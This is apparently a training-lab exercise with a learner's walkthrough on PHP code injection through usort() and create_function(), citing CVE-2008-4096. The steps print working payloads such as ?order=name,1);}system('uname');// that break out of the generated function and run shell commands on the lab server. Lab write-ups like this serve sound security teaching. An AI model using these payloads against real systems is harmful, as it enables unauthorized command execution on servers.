Code Execution 02

When ordering information, developers can use two methods:

    order by in a SQL request;
    usort in PHP code.

The function usort is often used with the function create_function to dynamically generate the "sorting" function, based on user-controlled information. If the web application lacks potent filtering and validation, this can lead to code execution.

By injecting a single quote, we can get an idea of what is going on:

Parse error: syntax error, unexpected '',$b->id'' (T_CONSTANT_ENCAPSED_STRING) in /var/www/index.php(29) : 
runtime-created function on line 1

Warning: usort() expects parameter 2 to be a valid callback, no array or string given in /var/www/index.php
 on line 29

The source code of the function looks like the following:

ZEND_FUNCTION(create_function)
{
  [...]
  eval_code = (char *) emalloc(eval_code_length);
  sprintf(eval_code, "function " LAMBDA_TEMP_FUNCNAME "(%s){%s}", Z_STRVAL_PP(z_function_args), Z_STRVAL_PP(z_function_code));

  eval_name = zend_make_compiled_string_description("runtime-created function" TSRMLS_CC);
  retval = zend_eval_string(eval_code, NULL, eval_name TSRMLS_CC);
  [...]

We can see that the code that will be evaluated is put inside curly brackets {...}, and we will need this information to correctly finish the syntax, after our injection.

As opposed to the previous code injection, here, you are not injecting inside single or double quotes. We know that we need to close the statement with } and comment out the rest of the code using // or # (with encoding). We can try poking around with:

    ?order=id;}//: we get an error message (Parse error: syntax error, unexpected ';'). We are probably missing one or more brackets.
    ?order=id);}//: we get a warning. That seems about right.
    ?order=id));}//: we get an error message (Parse error: syntax error, unexpected ')' i). We probably have too many closing brackets.

Since we now know how to finish the code correctly (a warning does not stop the execution flow), we can inject arbitrary code and gain code execution using ?order=id);}system('uname%20-a');// for example.

This challenge is based on a vulnerability in PHPMyAdmin: CVE-2008-4096.


To finish this exercise, you need to run the binary (/usr/local/bin/score) with your UUID (dd19b1aa-7a48-4881-87ce-4fd3f96516f8) as first argument:

/usr/local/bin/score dd19b1aa-7a48-4881-87ce-4fd3f96516f8

You can access this exercise using the following URL: http://ptc-ef6c6130-acd50c96.libcurl.so/. You can also use the TLS version if you're experiencing timeouts due to network filtering: https://ptl-ef6c6130-acd50c96.libcurl.so/.


Common Mistakes:

    Make sure you replace the full netcat command with the score command followed by your UUID: /usr/local/bin/score ....
 
 Steps: 
    1) Visit the given url: http://ptc-ef6c6130-acd50c96.libcurl.so/
    2) Here we can sort 2 ways to code execution. Either from SQl or Php. Well we can see ID and name of this page.
    3) Let's try with name. So click with 'name'. We can observe the parameter changes.
        It seems: http://ptc-ef6c6130-acd50c96.libcurl.so/?order=name
    4) We can inject on single quote on this parameter.
        http://ptc-ef6c6130-acd50c96.libcurl.so/?order=name'
        We can see the syntax error. It means something wrong is happening. Which seems as:
         
        Parse error: syntax error, unexpected '',$b->name'' (T_CONSTANT_ENCAPSED_STRING) in /var/www/index.php(29) : runtime-created function on line 1

        Warning: usort() expects parameter 2 to be a valid callback, no array or string given in /var/www/index.php on line 29
    5)  Let's sort the parameter and seems as:
        http://ptc-ef6c6130-acd50c96.libcurl.so/?order=name);}// 
        Here we can see error on strcmp()
        Seems as:Warning: strcmp() expects exactly 2 parameters, 1 given in /var/www/index.php(29) : runtime-created function on line 1
    6)  We can run uname command in this parameter.
        http://ptc-ef6c6130-acd50c96.libcurl.so/?order=name,1);}system('uname');//
        We can see Linux as a uname. Wow, let's try with other linux commands too.
    7)  From this we should be able to replace uname-a with /user/local/bin/score. This is core command with our UUID. 
        So then add UUID value in this parameter which looks as:
        http://ptc-ef6c6130-acd50c96.libcurl.so/?order=name,1);}system('/usr/local/bin/score UUID');//
         Now, replace UUID with (dd19b1aa-7a48-4881-87ce-4fd3f96516f8) as given in lab.
        It seems: 
        http://ptc-ef6c6130-acd50c96.libcurl.so/?order=name,1);}system('/usr/local/bin/score dd19b1aa-7a48-4881-87ce-4fd3f96516f8');//
    8) Bravo!!  Exercise completed!
    
        Happy Hacking!! :) 